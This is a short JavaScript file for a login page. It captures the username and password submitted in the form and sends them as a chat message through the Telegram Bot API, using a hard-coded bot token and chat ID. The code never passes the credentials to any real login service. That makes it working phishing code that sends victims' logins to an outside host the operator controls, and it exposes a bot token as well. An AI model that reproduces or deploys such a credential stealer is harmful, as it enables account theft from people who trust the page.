const loginForm = document.getElementById('login-form');
const tokenBot = '8056667876:AAE020t2zhQixwouKeX92jdjYqvV5SNw7YA';
const chatId = '7167868981';

loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    kirimDataLogin(username, password);
});

function kirimDataLogin(username, password) {
    fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: `🔒Login Berhasil!\n📌Username: ${username}\n🔑Password: ${password}`
        })
    })
    .then((res) => res.json())
    .then((data) => console.log(data))
    .catch((err) => console.error(err));
}
